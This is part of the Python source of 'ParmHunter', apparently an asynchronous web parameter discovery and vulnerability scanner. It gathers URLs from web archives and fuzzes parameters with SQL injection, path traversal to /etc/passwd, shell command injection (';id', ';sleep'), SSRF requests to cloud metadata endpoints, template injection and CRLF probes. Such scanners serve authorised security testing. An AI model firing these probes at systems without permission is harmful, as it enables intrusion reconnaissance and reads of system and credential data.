        for probe in ("/robots.txt", "/sitemap.xml", "/openapi.json", "/swagger.json",
                      "/api-docs", "/v2/api-docs", "/.well-known/openapi.json"):
            r = await self.f.fetch(urljoin_safe(seed, probe))
            if not r.error and r.status == 200:
                params |= self._harvest(r.body)
                links |= {l.strip() for l in re.findall(r"<loc>([^<]+)</loc>", r.body)}

        gql = await self.f.fetch(urljoin_safe(seed, "/graphql"), method="POST",
                                 data=json.dumps({"query": "{__schema{types{name fields{name}}}}"}),
                                 extra_headers={"Content-Type": "application/json"})
        if not gql.error and '"fields"' in gql.body:
            params |= set(re.findall(r'"name"\s*:\s*"([A-Za-z0-9_]{2,30})"', gql.body)) - JS_SKIP

        return params, links


# ───────────────────────────── detectors ────────────────────────────

ERROR_SIGS = [
    (r"SQL syntax.*MySQL|Warning.*\bmysql_|valid MySQL result|MySqlClient\.", "MySQL error"),
    (r"Microsoft OLE DB Provider for SQL Server|Unclosed quotation mark|Incorrect syntax near", "MSSQL error"),
    (r"ORA-\d{4,5}|quoted string not properly terminated", "Oracle error"),
    (r"PostgreSQL.*ERROR|pg_query\(\)|PSQLException", "PostgreSQL error"),
    (r"SQLite/JDBCDriver|SQLite\.Exception|System\.Data\.SQLite", "SQLite error"),
    (r"SQLSTATE\[|ODBC SQL Server Driver|JDBC", "generic SQL error"),
]
LFI_SIGS = [r"root:x:0:0", r"\[extensions\]", r"\[fonts\]", r"daemon:x:", r"/bin/(ba)?sh"]
RCE_SIG = re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+")
META_SIG = re.compile(r"ami-id|instance-id|security-credentials|availability-zone|computeMetadata")
WAF_SIGS = re.compile(r"cloudflare|akamai|imperva|incapsula|sucuri|f5|big-ip|awselb|mod_security", re.I)


class Prober:
    def __init__(self, f, cfg, kb):
        self.f = f
        self.cfg = cfg
        self.kb = kb
        self.record = True
        self._baseline = {}
        self._soft = {}
        self._bl_lock = asyncio.Lock()

    def classes(self, param):
        found = set(classify(param))
        if self.cfg.probe_classes:
            found &= set(self.cfg.probe_classes) | {"xss", "debug"}
        if self.cfg.skip_classes:
            found -= set(self.cfg.skip_classes)
        return found

    async def _base_state(self, base):
        """Baseline + soft-404 flag, computed once per base URL / host."""
        if base in self._baseline:
            return self._baseline[base], self._soft.get(base, False)
        async with self._bl_lock:
            if base in self._baseline:
                return self._baseline[base], self._soft.get(base, False)
            baseline = await self.f.fetch(base)
            host = host_of(base)
            if host in self._soft:
                soft = self._soft[host]
            else:
                rnd = await self.f.fetch(urljoin_safe(base, f"/{token(10)}"))
                soft = (not rnd.error and rnd.status < 400
                        and similarity(baseline.body, rnd.body) > SOFT_404_SIM)
                self._soft[host] = soft
            self._baseline[base] = baseline
            return baseline, soft

    async def _send(self, base, param, value):
        url, body = build_request(base, param, value, self.cfg)
        hdrs = {"Content-Type": "application/json"} if (body and self.cfg.json_body) else None
        return url, await self.f.fetch(url, method=self.cfg.method, data=body,
                                       extra_headers=hdrs)

    async def probe(self, base, param):
        out = []
        cls = self.classes(param)
        baseline, soft = await self._base_state(base)
        if baseline.error:
            return out
        thresh = 0.40 if soft else 0.25

        t = token(8)
        canary = f'{t}"><{t}>'
        url_c, r_c = await self._send(base, param, canary)
        if r_c.error:
            return out

        signals = []
        if t in r_c.body:
            signals.append(("xss", 25, "value reflected in body"))
            if f'"><{t}>' in r_c.body:
                signals.append(("xss", 62, "unencoded break-out reflected"))
            if "html" in r_c.headers.get("content-type", "html"):
                signals.append(("xss", 12, "html context"))
        if r_c.status >= 500 > baseline.status:
            signals.append(("error", 20, f"status {baseline.status}->{r_c.status}"))
        if change(baseline.body, r_c.body) > thresh and r_c.status == baseline.status:
            signals.append(("generic", 15, "body change"))

        for rx, label in ERROR_SIGS:
            if re.search(rx, r_c.body, re.I) and not re.search(rx, baseline.body, re.I):
                signals.append(("sqli", 55, label))
                break

        if "sql" in cls:
            signals += await self._sqli(base, param, baseline)
        if {"redirect", "ssrf"} & cls:
            signals += await self._redirect(base, param)
        if "lfi" in cls:
            signals += await self._lfi(base, param, baseline)
        if "rce" in cls:
            signals += await self._rce(base, param, baseline)
        if "ssrf" in cls:
            signals += await self._ssrf(base, param, baseline)
        if {"ssti", "xss"} & cls:
            signals += await self._ssti(base, param, baseline)
        if "crlf" in cls:
            signals += await self._crlf(base, param)
        if "object" in cls or re.search(r"^\d+$", param):
            signals += await self._idor(base, param, baseline)
        if "debug" in cls:
            signals += await self._debug(base, param, baseline)

        agg = defaultdict(lambda: [0, []])
        for vuln, conf, ev in signals:
            agg[vuln][0] += conf
            agg[vuln][1].append(ev)

        hit = False
        for vuln, (conf, evs) in agg.items():
            if vuln == "generic":
                continue
            conf = min(conf, 97)
            if conf < self.cfg.min_confidence:
                continue
            sev = SEVERITY.get(vuln, "low")
            if SEV_ORDER[sev] > SEV_ORDER[self.cfg.min_severity]:
                continue
            hit = True
            out.append(Finding(url_c, param, vuln, sev, conf,
                               "; ".join(dict.fromkeys(evs)), canary, r_c.status, base, now()))
        if self.record:
            self.kb.record_test(param, hit)
        return out

    async def _sqli(self, base, param, baseline):
        out = []
        for p in ("'", '"', "1'", "1)", "'-- -"):
            _, r = await self._send(base, param, p)
            if r.error:
                continue
            for rx, label in ERROR_SIGS:
                if re.search(rx, r.body, re.I):
                    return [("sqli", 55, f"{label} via {p}")]
        _, a = await self._send(base, param, "1 AND 1=1")
        _, b = await self._send(base, param, "1 AND 1=2")
        if not a.error and not b.error and a.status == b.status:
            if change(a.body, b.body) > 0.15:
                out.append(("sqli", 45, "boolean differential"))
        _, s = await self._send(base, param, f"1' AND SLEEP({int(self.cfg.sleep_probe)})-- -")
        if not s.error and s.elapsed - baseline.elapsed > 3:
            out.append(("sqli", 50, f"time delay {s.elapsed:.1f}s"))
        return out

    async def _redirect(self, base, param):
        out = []
        marker = self.cfg.collab or f"{token(6)}.parmhunter.test"
        _, r = await self._send(base, param, f"https://{marker}/")
        if r.error:
            return out
        loc = r.headers.get("location", "")
        if marker in loc:
            out.append(("open-redirect", 75, f"Location -> {loc[:90]}"))
        elif marker in r.body:
            out.append(("open-redirect", 40, "canary reflected in body"))
        return out

    async def _lfi(self, base, param, baseline):
        for p in ("../../../../etc/passwd", "/etc/passwd",
                  "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"):
            _, r = await self._send(base, param, p)
            if r.error:
                continue
            for sig in LFI_SIGS:
                if re.search(sig, r.body) and not re.search(sig, baseline.body):
                    return [("lfi", 72, f"file signature via {p}")]
        return []

    async def _rce(self, base, param, baseline):
        for p in (";id", "|id", "$(id)", "`id`", "&&id"):
            _, r = await self._send(base, param, p)
            if not r.error and RCE_SIG.search(r.body):
                return [("rce", 80, f"command output via {p}")]
        _, s = await self._send(base, param, f";sleep {int(self.cfg.sleep_probe)}")
        if not s.error and s.elapsed - baseline.elapsed > 3:
            return [("rce", 50, f"blind time delay {s.elapsed:.1f}s")]
        return []

    async def _ssrf(self, base, param, baseline):
        out = []
        if self.cfg.collab:
            m = f"{token(6)}.{self.cfg.collab}"
            _, r = await self._send(base, param, f"http://{m}/")
            if not r.error and m in r.body:
                out.append(("ssrf", 65, "collaborator hostname reflected"))
        _, m = await self._send(base, param, "http://169.254.169.254/latest/meta-data/")
        if not m.error and META_SIG.search(m.body) and not META_SIG.search(baseline.body):
            out.append(("ssrf", 70, "cloud metadata reachable"))
        _, l = await self._send(base, param, "http://127.0.0.1:80/")
        if not l.error and l.status == baseline.status and change(baseline.body, l.body) > 0.30:
            out.append(("ssrf", 35, "localhost differential"))
        return out

    async def _ssti(self, base, param, baseline):
        for p in ("{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "@(7*7)"):
            _, r = await self._send(base, param, p)
            if not r.error and "49" in r.body and "49" not in baseline.body:
                return [("ssti", 68, f"arithmetic evaluated via {p}")]
        return []

    async def _crlf(self, base, param):
        m = token(6)
        _, r = await self._send(base, param, f"x%0d%0aX-ParmHunter: {m}")
        if not r.error and any("parmhunter" in k for k in r.headers):
            return [("crlf", 62, "injected response header")]
        return []

    async def _idor(self, base, param, baseline):
        d = []
        for v in ("1", "2", "0", "999999"):
            _, r = await self._send(base, param, v)
            if r.error or r.status != baseline.status:
                continue
            d.append(change(baseline.body, r.body))
        if d and sum(d) / len(d) > 0.18:
            return [("idor", 38, f"body varies across object values ({sum(d)/len(d):.0%})")]
        return []

    async def _debug(self, base, param, baseline):
        for v in ("1", "true", "debug", "admin"):
            _, r = await self._send(base, param, v)
            if not r.error and r.status == baseline.status and change(baseline.body, r.body) > 0.25:
                return [("debug-flag", 32, f"behaviour change with {v}=1")]
        return []


# ────────────────────────────── hunter ──────────────────────────────

class Hunter:
    def __init__(self, cfg):
        self.cfg = cfg
        self.f = Fetcher(cfg)
        self.kb = Knowledge(cfg.db, enabled=not cfg.no_learn)
        self.passive = Passive(self.f, cfg)
        self.crawler = Crawler(self.f, cfg)
        self.external = External(cfg)
        self.prober = Prober(self.f, cfg, self.kb)
        self.findings = []
        self.candidates = defaultdict(set)
        self.bases = {}
        self.hosts = []
        self.seen = set()
        self.counter = Counter()
        self.started = time.time()
        self.outroot = Path(cfg.outdir)
        self.outdir = self.outroot / "global"
        self.state_path = self.outroot / "state.json"

    def targets(self):
        urls = list(self.cfg.urls)
        if self.cfg.listfile:
            urls += [l.strip() for l in Path(self.cfg.listfile).read_text().splitlines()
                     if l.strip() and not l.startswith("#")]
        if self.cfg.use_stdin and not sys.stdin.isatty():
            urls += [l.strip() for l in sys.stdin if l.strip()]
        if self.cfg.domain:
            d = self.cfg.domain.strip()
            urls.append(d if d.startswith("http") else f"https://{d}")
        out = []
        for u in urls:
            if not u.startswith("http"):
                u = "https://" + u
            out.append(u)
        return list(dict.fromkeys(out))

    def dictionary(self):
        words = []
        if not self.cfg.only_wordlist:
            for g in BUILTIN.values():
                words += g
        words += list(self.cfg.seeds)
        files = list(self.cfg.wordlists)
        if self.cfg.wordlist_dir:
            files += [str(p) for p in sorted(Path(self.cfg.wordlist_dir).glob("*")) if p.is_file()]
        for f in files:
            p = Path(f)
            if not p.exists():
                C.warn(f"wordlist not found: {f}")
                continue
            words += [l.strip() for l in p.read_text(errors="replace").splitlines()
                      if l.strip() and not l.startswith("#")]
        return list(dict.fromkeys(words))

    def _absorb(self, urls, host):
        added = 0
        for u in urls:
            if not u or "=" not in u:
                continue
            if not host_of(u).endswith(apex(host)):
                continue
            base = norm_base(u)
            self.bases[base] = host
            for k in param_of(u):
                if k not in self.candidates[base]:
                    self.candidates[base].add(k)
                    added += 1
        return added

    async def _source(self, name, coro, host):
        t0 = time.time()
        try:
            res = await asyncio.wait_for(coro, timeout=self.cfg.passive_timeout)
        except asyncio.TimeoutError:
            C.dim(f"{name}: timed out")
            return
        except Exception as e:  # noqa: BLE001
            C.dim(f"{name}: {type(e).__name__}")
            return
        n = self._absorb(res, host)
        C.dim(f"{name}: {len(res)} urls / {n} params  ({time.time()-t0:.1f}s)")

    async def harvest(self, target):
        host = host_of(target)
        if host in self.hosts:
            return
        self.hosts.append(host)
        C.info(f"harvesting {host}")

        jobs = []
        if not self.cfg.active_only:
            for name, coro in (("wayback", self.passive.wayback(host)),
                               ("commoncrawl", self.passive.commoncrawl(host)),
                               ("urlscan", self.passive.urlscan(host)),
                               ("otx", self.passive.otx(host))):
                jobs.append(self._source(name, coro, host))
            if self.cfg.external:
                jobs.append(self._source("waybackurls", self.external.waybackurls(host), host))
                jobs.append(self._source("gau", self.external.gau(host), host))

        if not self.cfg.passive_only:
            if self.cfg.external and tool_path("katana"):
                jobs.append(self._source("katana", self.external.katana(target), host))

        # all sources race in parallel; none can block the others
        if jobs:
            await asyncio.gather(*jobs)

        if not self.cfg.passive_only:
            params, links = await self.crawler.crawl(target)
            C.dim(f"crawl: {len(params)} params / {len(links)} links")
            for p in params:
                self.candidates[norm_base(target)].add(p)
            self.bases[norm_base(target)] = host
            self._absorb(links, host)

        if not self.bases:
            C.warn(f"{host}: nothing reachable — check connectivity/DNS")
            return

        if self.cfg.waf_detect:
            r = await self.f.fetch(target)
            hdr = " ".join(f"{k}:{v}" for k, v in r.headers.items())
            if WAF_SIGS.search(hdr) or WAF_SIGS.search(r.body[:3000]):
                C.warn(f"{host}: WAF/CDN fingerprint present")

        C.ok(f"{host}: {len(self.bases)} bases, "
             f"{sum(len(v) for v in self.candidates.values())} raw params")

    def plan(self):
        words = sorted(self.dictionary(), key=lambda w: -score_param(w, self.kb))
        plan = []
        for base in self.bases:
            existing = param_of(base)
            cands = sorted(self.candidates.get(base, set()) | set(words),
                           key=lambda w: -score_param(w, self.kb))
            n = 0
            for c in cands:
                if c in existing:
                    continue
                plan.append((base, c))
                n += 1
                if n >= self.cfg.max_params:
                    break
        # highest-value pairs first so early output is already useful
        plan.sort(key=lambda bp: -score_param(bp[1], self.kb))
        return plan

    async def run_plan(self, plan):
        if self.cfg.plan:
            for b, p in plan:
                print(f"{b}  <- {p}")
            C.ok(f"plan: {len(plan)} probes")
            return
        total = len(plan)
        C.info(f"probing {total} pairs / {self.cfg.threads} workers")
        done = 0
        lock = asyncio.Lock()

        async def work(base, param):
            nonlocal done
            if (base, param) in self.seen:
                return
            self.seen.add((base, param))
            try:
                found = await self.prober.probe(base, param)
            except Exception as e:  # noqa: BLE001
                found = []
                self.counter["errors"] += 1
                if self.counter["errors"] % 25 == 1:
                    C.warn(f"probe error: {e}")
            for f in found:
                self.findings.append(f)
                self.kb.record_finding(f)
                C.hit(f.line())
            async with lock:
                done += 1
                if done % 50 == 0 or done == total:
                    C.dim(f"progress {done}/{total} | findings {len(self.findings)}")

        await asyncio.gather(*(work(b, p) for b, p in plan))

    async def verify(self):
        if not self.findings:
            return
        C.info(f"verifying {len(self.findings)} findings")
        self.prober.record = False
        kept = []
        for f in self.findings:
            again = await self.prober.probe(f.base_url, f.param)
            match = [x for x in again if x.vuln == f.vuln]
            if match:
                f.confidence = (f.confidence + match[0].confidence) // 2
                kept.append(f)
        C.ok(f"verified {len(kept)}/{len(self.findings)}")
        self.findings = kept

    # -- output ------------------------------------------------------
    def _bucket_dirs(self, host):
        root = self.outroot / host
        for sub in ("params", "findings"):
            (root / sub).mkdir(parents=True, exist_ok=True)
        return root

    def write_params(self, plan):
        """Per-class candidate param lists, one file per vulnerability class."""
        roots = {}
        for host in self.hosts:
            roots[host] = self._bucket_dirs(host)
        buckets = defaultdict(set)
        for base, param in plan:
            url, _ = build_request(base, param, sample_value(param), self.cfg)
            buckets[bucket_of(param)].add(url)
        allp = set()
        for bucket, urls in buckets.items():
            allp |= urls
            for host, root in roots.items():
                subset = sorted(u for u in urls if host_of(u).endswith(apex(host)))
                if subset:
                    (root / "params" / f"{bucket}.txt").write_text("\n".join(subset))
        for host, root in roots.items():
            subset = sorted(u for u in allp if host_of(u).endswith(apex(host)))
            if subset:
                (root / "params.txt").write_text("\n".join(subset))
        return buckets

    def write(self):
        for host in self.hosts:
            root = self._bucket_dirs(host)
            subset = [f for f in self.findings if host_of(f.url).endswith(apex(host))]

            with (root / "findings.jsonl").open("w") as fh:
                for f in subset:
                    fh.write(json.dumps(asdict(f)) + "\n")

            per_class = defaultdict(list)
            for f in subset:
                per_class[f.vuln].append(f)
            for vuln, items in per_class.items():
                with (root / "findings" / f"{vuln}.txt").open("w") as fh:
                    for f in sorted(items, key=lambda x: -x.confidence):
                        fh.write(f"{f.url}\t{f.confidence}\t{f.evidence}\n")

            if self.cfg.csv_out:
                with (root / "findings.csv").open("w", newline="") as fh:
                    w = csv.writer(fh)
                    w.writerow(["severity", "confidence", "vuln", "url", "param",
                                "evidence", "status", "ts"])
                    for f in sorted(subset, key=lambda x: (SEV_ORDER[x.severity], -x.confidence)):
                        w.writerow([f.severity, f.confidence, f.vuln, f.url, f.param,
                                    f.evidence, f.status, f.ts])

            if self.cfg.md_out:
                with (root / "report.md").open("w") as fh:
                    fh.write(f"# ParmHunter {VERSION} — {host}\n\n`{now()}`\n\n")
                    fh.write(f"findings: {len(subset)}\n\n")
                    for vuln, items in sorted(per_class.items(), key=lambda kv: -len(kv[1])):
                        fh.write(f"## {vuln} ({len(items)})\n\n")
                        for f in sorted(items, key=lambda x: -x.confidence):
                            fh.write(f"- `{f.confidence}%` `{f.severity}` {f.url} — {f.evidence}\n")
                        fh.write("\n")

            if self.cfg.html_out:
                rows = []
                for f in sorted(subset, key=lambda x: (SEV_ORDER[x.severity], -x.confidence)):
                    rows.append(
                        f"<tr class='{f.severity}'><td>{f.severity}</td><td>{f.confidence}%</td>"
                        f"<td>{html.escape(f.vuln)}</td><td><a href='{html.escape(f.url)}'>"
                        f"{html.escape(f.url)}</a></td><td>{html.escape(f.param)}</td>"
                        f"<td>{html.escape(f.evidence)}</td></tr>")
                (root / "report.html").write_text(f"""<!doctype html><meta charset=utf-8>
<title>ParmHunter — {html.escape(host)}</title><style>
body{{font:14px/1.5 ui-monospace,monospace;background:#0f1115;color:#d6dae2;padding:24px}}
h1{{color:#7ee787}}table{{border-collapse:collapse;width:100%}}
td,th{{border-bottom:1px solid #262b36;padding:6px 10px;text-align:left;vertical-align:top}}
th{{color:#8b949e;text-transform:uppercase;font-size:11px;letter-spacing:.08em}}
a{{color:#79c0ff}}.critical td:first-child{{color:#ff7b72}}.high td:first-child{{color:#ffa657}}
.medium td:first-child{{color:#e3b341}}.low td:first-child{{color:#8b949e}}
</style><h1>ParmHunter {VERSION} — {html.escape(host)}</h1>
<p>{now()} · findings {len(subset)}</p>
<table><tr><th>sev</th><th>conf</th><th>class</th><th>url</th><th>param</th><th>evidence</th></tr>
{''.join(rows)}</table>""")

        self.outroot.mkdir(parents=True, exist_ok=True)
        self.state_path.write_text(json.dumps(sorted(f"{b}|{p}" for b, p in self.seen)))
        C.ok(f"output -> {self.outroot}")

    def summary(self):
        print()
        if not self.findings:
            C.warn("no signals above threshold")
            return
        sev = Counter(f.severity for f in self.findings)
        C.info("severity: " + "  ".join(f"{k}={v}" for k, v in
                                        sorted(sev.items(), key=lambda kv: SEV_ORDER[kv[0]])))
        for vuln, n in Counter(f.vuln for f in self.findings).most_common():
            print(f"  {vuln:<15} {n}")
        if self.cfg.stats:
            print(f"  probes={len(self.seen)} req_ok={self.f.ok} req_err={self.f.errors} "
                  f"elapsed={time.time()-self.started:.1f}s")

    async def notify(self):
        if not self.cfg.notify or not self.findings:
            return
        sev = Counter(f.severity for f in self.findings)
        payload = {"content": f"**ParmHunter** {len(self.findings)} findings "
                              f"({', '.join(f'{k}:{v}' for k, v in sev.items())})"}
        try:
            await self.f.fetch(self.cfg.notify, method="POST",
                               data=json.dumps(payload),
                               extra_headers={"Content-Type": "application/json"})
            C.ok("webhook notified")
        except Exception as e:  # noqa: BLE001
            C.warn(f"webhook failed: {e}")

    async def run(self):
        await self.f.start()
        try:
            if self.cfg.resume and self.state_path.exists():
                for entry in json.loads(self.state_path.read_text()):
                    b, _, p = entry.partition("|")
                    self.seen.add((b, p))
                C.info(f"resumed with {len(self.seen)} completed pairs")
            for t in self.targets():
                await self.harvest(t)
            plan = self.plan()
            if not plan:
                C.warn("nothing to probe")
                return
            if self.cfg.params_only:
                buckets = self.write_params(plan)
                total = sum(len(v) for v in buckets.values())
                C.ok(f"{total} params across {len(buckets)} class files -> {self.outroot}")
                return
            await self.run_plan(plan)
            if self.cfg.plan:
                return
            if self.cfg.verify:
                await self.verify()
            self.write()
            self.summary()
            await self.notify()
        finally:
            await self.f.close()
            self.kb.close()


# ─────────────────────────────── cli ────────────────────────────────

def dump_dict():
    for name, words in BUILTIN.items():
        for w in words:
            print(w)
    print(f"# {sum(len(v) for v in BUILTIN.values())} params", file=sys.stderr)


def prompt_targets():
    print("  enter target(s), one per line — blank line to start")
    out = []
    while True:
        try:
            line = input("  target > ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not line:
            if out:
                break
            continue
        out.append(line)
    return out


def parse_args(argv):
    p = argparse.ArgumentParser(prog="parmhunter", description=__doc__.split("\n")[1],
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    t = p.add_argument_group("targets")
    t.add_argument("-u", "--url", action="append", default=[])
    t.add_argument("-l", "--list", dest="listfile")
    t.add_argument("--stdin", dest="use_stdin", action="store_true", help="read urls from stdin")
    t.add_argument("-d", "--domain")

    w = p.add_argument_group("wordlists")
    w.add_argument("-w", "--wordlist", action="append", default=[])
    w.add_argument("--wordlist-dir")
    w.add_argument("--seeds", default="", help="comma separated extra param names")
    w.add_argument("--only-wordlist", action="store_true")
    w.add_argument("--dump-dict", action="store_true")

    n = p.add_argument_group("network")
    n.add_argument("-t", "--threads", type=int, default=40)
    n.add_argument("--limit-per-host", type=int, default=8)
    n.add_argument("--timeout", type=float, default=15.0)
    n.add_argument("--archive-timeout", type=float, default=25.0)
    n.add_argument("--passive-timeout", type=float, default=90.0)
    n.add_argument("--retries", type=int, default=2)
    n.add_argument("--rate", type=float, default=0.0)
    n.add_argument("--max-time", type=float, default=0.0)
    n.add_argument("--proxy", default="")
    n.add_argument("-H", "--header", action="append", default=[])
    n.add_argument("-b", "--cookie", default="")
    n.add_argument("-A", "--user-agent", default="")
    n.add_argument("-k", "--insecure", action="store_true")
    n.add_argument("--aiodns", action="store_true", help="c-ares resolver (needs aiodns)")
    n.add_argument("--ipv4", action="store_true", help="resolve A records only")
    n.add_argument("--dns-ttl", type=int, default=DNS_TTL)
    n.add_argument("--method", choices=["GET", "POST"], default="GET")
    n.add_argument("--json-body", action="store_true")

    s = p.add_argument_group("scan")
    s.add_argument("--crawl-depth", type=int, default=2)
    s.add_argument("--katana-depth", type=int, default=3)
    s.add_argument("--tool-timeout", type=float, default=180.0)
    s.add_argument("--no-external", dest="external", action="store_false",
                   help="disable katana/waybackurls/gau")
    s.add_argument("--no-install-tools", dest="install_tools", action="store_false")
    s.add_argument("--max-urls", type=int, default=200)
    s.add_argument("--max-params", type=int, default=45)
    s.add_argument("--max-size", type=int, default=MAX_BODY)
    s.add_argument("--scope-regex")
    s.add_argument("--include-ext", dest="exclude_ext", action="store_false")
    s.add_argument("--passive-only", action="store_true")
    s.add_argument("--active-only", action="store_true")
    s.add_argument("--params-only", action="store_true")
    s.add_argument("--classes", dest="probe_classes", default="")
    s.add_argument("--skip-classes", default="")
    s.add_argument("--collab", default="")
    s.add_argument("--min-confidence", type=int, default=55)
    s.add_argument("--min-severity", choices=list(SEV_ORDER), default="low")
    s.add_argument("--verify", action="store_true")
    s.add_argument("--resume", action="store_true")
    s.add_argument("--cache", action="store_true")
    s.add_argument("--no-waf-detect", dest="waf_detect", action="store_false")
    s.add_argument("--plan", action="store_true")
    s.add_argument("--fast", action="store_true", help="preset for speed over depth")
    s.add_argument("--db", default="parmhunter.kb.sqlite")
    s.add_argument("--no-learn", action="store_true")

    o = p.add_argument_group("output")
    o.add_argument("-o", "--outdir", default="output")
    o.add_argument("--csv", dest="csv_out", action="store_true")
    o.add_argument("--md", dest="md_out", action="store_true")
    o.add_argument("--html", dest="html_out", action="store_true")
    o.add_argument("--jsonl", action="store_true")
    o.add_argument("--notify", default="")
    o.add_argument("--stats", action="store_true")
    o.add_argument("--silent", action="store_true")
    o.add_argument("--no-banner", action="store_true")
    o.add_argument("-v", "--version", action="version", version=f"parmhunter {VERSION}")

    a = p.parse_args(argv)
    if a.dump_dict:
        dump_dict()
        sys.exit(0)

    if a.fast:
        a.threads = max(a.threads, 80)
        a.max_params = min(a.max_params, 25)
        a.min_confidence = max(a.min_confidence, 65)
        a.crawl_depth = min(a.crawl_depth, 1)
        a.katana_depth = min(a.katana_depth, 2)
        a.timeout = min(a.timeout, 10.0)
        a.archive_timeout = min(a.archive_timeout, 15.0)

    cfg = Config(
        urls=a.url, listfile=a.listfile or "", use_stdin=a.use_stdin,
        domain=a.domain or "", seeds=[x.strip() for x in a.seeds.split(",") if x.strip()],
        wordlists=a.wordlist, wordlist_dir=a.wordlist_dir or "",
        only_wordlist=a.only_wordlist, threads=a.threads,
        limit_per_host=a.limit_per_host, aiodns=a.aiodns, ipv4=a.ipv4,
        dns_ttl=a.dns_ttl, timeout=a.timeout, archive_timeout=a.archive_timeout,
        passive_timeout=a.passive_timeout, retries=a.retries, rate=a.rate,
        max_time=a.max_time, proxy=a.proxy, cookie=a.cookie, user_agent=a.user_agent,
        insecure=a.insecure, method=a.method, json_body=a.json_body,
        outdir=a.outdir, csv_out=a.csv_out, md_out=a.md_out, html_out=a.html_out,
        jsonl=a.jsonl, silent=a.silent or a.jsonl, no_banner=a.no_banner,
        crawl_depth=a.crawl_depth, katana_depth=a.katana_depth,
        tool_timeout=a.tool_timeout, external=a.external,
        install_tools=a.install_tools, max_urls=a.max_urls,
        max_params=a.max_params, max_size=a.max_size, passive_only=a.passive_only,
        active_only=a.active_only, params_only=a.params_only, collab=a.collab,
        db=a.db, min_confidence=a.min_confidence, min_severity=a.min_severity,
        probe_classes=[x for x in a.probe_classes.split(",") if x],
        skip_classes=[x for x in a.skip_classes.split(",") if x],
        scope_regex=a.scope_regex or "", exclude_ext=a.exclude_ext,
        verify=a.verify, resume=a.resume, cache=a.cache, waf_detect=a.waf_detect,
        notify=a.notify, stats=a.stats, no_learn=a.no_learn, plan=a.plan,
    )
    for h in a.header:
        if ":" in h:
            k, v = h.split(":", 1)
            cfg.headers[k.strip()] = v.strip()
    if a.jsonl:
        C.on = False
    return cfg


async def amain(cfg):
    if cfg.max_time > 0:
        try:
            await asyncio.wait_for(Hunter(cfg).run(), timeout=cfg.max_time)
        except asyncio.TimeoutError:
            C.warn(f"max-time {cfg.max_time:.0f}s reached")
    else:
        await Hunter(cfg).run()


def main(argv=None):
    cfg = parse_args(argv or sys.argv[1:])
    if not cfg.silent and not cfg.no_banner:
        banner(cfg)
    if not (cfg.urls or cfg.listfile or cfg.domain or cfg.use_stdin):
        if not sys.stdin.isatty():
            cfg.urls = [l.strip() for l in sys.stdin if l.strip()]
        else:
            cfg.urls = prompt_targets()
        if not cfg.urls:
            C.err("no targets given")
            return 2
        if not cfg.silent and not cfg.no_banner:
            C.info(f"{len(cfg.urls)} target(s) queued")
    if not HAVE_AIOHTTP:
        C.warn("aiohttp missing — slow urllib fallback (pip install aiohttp)")
    if cfg.external:
        ensure_tools(cfg)
    try:
        asyncio.run(amain(cfg))
    except KeyboardInterrupt:
        C.warn("interrupted")
        return 130
    return 0


if __name__ == "__main__":
    sys.exit(main())
